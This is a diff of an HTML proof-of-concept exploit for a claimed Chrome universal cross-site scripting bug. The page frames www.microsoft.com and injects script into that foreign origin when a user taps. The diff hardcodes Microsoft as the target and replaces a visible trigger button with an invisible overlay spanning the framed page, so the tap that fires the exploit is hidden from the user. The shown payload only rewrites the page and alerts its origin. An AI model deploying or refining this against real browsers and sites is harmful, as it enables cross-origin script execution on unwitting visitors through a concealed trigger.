@@ -1,7 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Chrome Stable relatedTarget UXSS — Example.com</title>
+<title>Chrome Stable relatedTarget UXSS — Microsoft.com</title>
 <style>
   * { box-sizing: border-box; }
   body { margin: 0; background: #0b1422; color: #eef7ff; font: 14px system-ui,sans-serif; }
@@ -10,27 +10,23 @@
   #summary { color: #9fe1ff; }
   #log { height: 78px; margin: 6px 0 0; overflow: auto; white-space: pre-wrap; }
   iframe { position: fixed; inset: 150px 0 0; width: 100%; height: calc(100% - 150px); border: 4px solid #4b83da; background: white; }
-  #trigger { position: fixed; z-index: 30; left: 50%; top: 56%; transform: translate(-50%,-50%); padding: 22px 26px; border: 0; border-radius: 12px; background: #d64b69; color: white; font: 18px system-ui,sans-serif; }
+  #trigger { position: fixed; z-index: 30; inset: 150px 0 0; background: transparent; }
 </style>
 <header>
-  <strong>PoC_by_xzyhellsing — Chrome Stable relatedTarget UXSS</strong>
-  <div id="summary">Tap the red button once. No credentials or private data are accessed.</div>
+  <strong>PoC_by_ContractGooner — Chrome Stable relatedTarget UXSS</strong>
+  <div id="summary">Tap once anywhere inside the framed page below. No credentials or private data are accessed.</div>
   <pre id="log"></pre>
 </header>
 <iframe id="victim"></iframe>
-<button id="trigger">One trusted tap</button>
+<div id="trigger" aria-hidden="true"></div>
 <script>
 (() => {
   "use strict";
 
-  const marker = "PoC_by_xzyhellsing";
+  const marker = "PoC_by_ContractGooner";
   const params = new URLSearchParams(location.search);
-  const microsoftTarget = location.hostname.startsWith("microsoft-related-target-uxss") ||
-    location.pathname.endsWith("/microsoft.html") || params.get("target") === "microsoft";
-  const targetUrl = microsoftTarget
-    ? "https://www.microsoft.com/robots.txt?relatedtarget-uxss=microsoft"
-    : "https://example.com/?relatedtarget-uxss=example";
-  const expectedOrigin = microsoftTarget ? "https://www.microsoft.com" : "https://example.com";
+  const targetUrl = "https://www.microsoft.com/robots.txt?relatedtarget-uxss=microsoft";
+  const expectedOrigin = "https://www.microsoft.com";
   const matchedControl = params.get("control") === "1" || location.hash === "#control";
   const trigger = document.querySelector("#trigger");
   const victim = document.querySelector("#victim");
@@ -42,9 +38,9 @@
   let popupCounter = 0;
 
   window.__relatedTargetRecords = records;
-  document.title = `Chrome Stable relatedTarget UXSS — ${microsoftTarget ? "Microsoft" : "Example.com"}`;
+  document.title = "Chrome Stable relatedTarget UXSS — Microsoft.com";
   document.querySelector("header strong").textContent =
-    `PoC_by_xzyhellsing — Chrome Stable relatedTarget UXSS — ${microsoftTarget ? "Microsoft" : "Example.com"}`;
+    "PoC_by_ContractGooner — Chrome Stable relatedTarget UXSS — Microsoft.com";
 
   function log(kind, detail = {}) {
     records.push({time: performance.now(), kind, detail});
@@ -57,11 +53,11 @@
     const proofSource = `(() => {
       const originProof = location.origin;
       const hrefProof = location.href;
-      document.documentElement.innerHTML = '<body style="font:24px system-ui;padding:32px"><h1 id="PoC_by_xzyhellsing">PoC_by_xzyhellsing</h1><p id="foreign-origin"></p><pre id="foreign-href"></pre></body>';
+      document.documentElement.innerHTML = '<body style="font:24px system-ui;padding:32px"><h1 id="PoC_by_ContractGooner">PoC_by_ContractGooner</h1><p id="foreign-origin"></p><pre id="foreign-href"></pre></body>';
       document.getElementById('foreign-origin').textContent = originProof;
       document.getElementById('foreign-href').textContent = hrefProof;
       document.documentElement.dataset.relatedTargetUxss = 'confirmed';
-      document.title = 'PoC_by_xzyhellsing relatedTarget ' + originProof;
+      document.title = 'PoC_by_ContractGooner relatedTarget ' + originProof;
       alert(originProof);
     })()`;
 
@@ -74,8 +70,8 @@
 
       document.documentElement.dataset.relatedTargetArmed = ${JSON.stringify(marker)};
       const childMarker = document.createElement('div');
-      childMarker.id = 'PoC_by_xzyhellsing_child';
-      childMarker.textContent = 'PoC_by_xzyhellsing foreign child armed: ' + location.origin;
+      childMarker.id = 'PoC_by_ContractGooner_child';
+      childMarker.textContent = 'PoC_by_ContractGooner foreign child armed: ' + location.origin;
       childMarker.style.cssText = 'position:fixed;inset:0 auto auto 0;z-index:2147483647;background:#7b1020;color:white;padding:10px;font:16px system-ui';
       document.documentElement.append(childMarker);
 
@@ -139,7 +135,7 @@
     }
 
     attacked = true;
-    const popupName = `related_target_example_${Date.now()}_${++popupCounter}`;
+    const popupName = `related_target_microsoft_${Date.now()}_${++popupCounter}`;
     try {
       const bootstrap = owner.createElement("script");
       const nonceSource = owner.querySelector("script[nonce]");
@@ -182,7 +178,6 @@
 
   trigger.addEventListener("pointerdown", event => {
     log("ARM", {pointerId: event.pointerId});
-    try { trigger.focus({preventScroll: true}); } catch (_) {}
     try { trigger.setPointerCapture(event.pointerId); } catch (error) {
       log("CAPTURE_ERROR", {phase: "set", name: error.name, message: error.message});
     }
@@ -203,3 +198,4 @@
   log("READY", {targetUrl, expectedOrigin, matchedControl, primitive: "PointerEvent.relatedTarget"});
 })();
 </script>
+
